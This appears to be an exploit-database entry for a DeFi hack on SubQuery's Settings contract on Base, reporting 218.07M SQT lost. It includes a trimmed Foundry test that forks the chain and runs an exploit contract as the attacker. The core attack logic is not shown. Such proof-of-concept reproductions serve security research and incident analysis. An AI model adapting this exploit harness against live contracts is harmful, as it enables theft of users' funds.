# [?] SubQuerySettings - Settings access control

## Summary
Severity: Unknown
Chain: Base
Component: SubQuerySettings
Published: 2026-04-12
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/SubQuerySettings_exp.sol
Type: defi-exploit-poc

## Details
Lost: 218.07M SQT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    ISubQuerySettings private constant settings = ISubQuerySettings(SETTINGS_PROXY);
    ISubQueryStaking private constant staking = ISubQueryStaking(STAKING_PROXY);
    IERC20 private constant sqt = IERC20(SQT);

    function setUp() public {
        uint256 forkBlock = 44_590_468;
        vm.createSelectFork("base", forkBlock);
        fundingToken = SQT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(SETTINGS_PROXY, "SubQuery Settings proxy");
        vm.label(STAKING_PROXY, "SubQuery Staking proxy");
        vm.label(SQT, "SQT");
    }

    function testExploit() public balanceLog {
        address originalStakingManager = settings.getContractAddress(SQContracts.StakingManager);
        address originalRewardsDistributor = settings.getContractAddress(SQContracts.RewardsDistributor);
        uint256 stakingSqtBefore = sqt.balanceOf(STAKING_PROXY);
        uint256 attackerSqtBefore = sqt.balanceOf(ATTACKER);

        SubQuerySettingsExploit exploit = new SubQuerySettingsExploit(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 attackerProfit = sqt.balanceOf(ATTACKER) - attackerSqtBefore;
        uint256 expectedFee = (stakingSqtBefore * staking.unbondFeeRate()) / PER_MILL;

        assertEq(settings.getContractAddress(SQContracts.StakingManager), originalStakingManager, "manager restored");
        assertEq(
            settings.getContractAddress(SQContracts.RewardsDistributor),
            originalRewardsDistributor,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/SubQuerySettings_exp.sol_
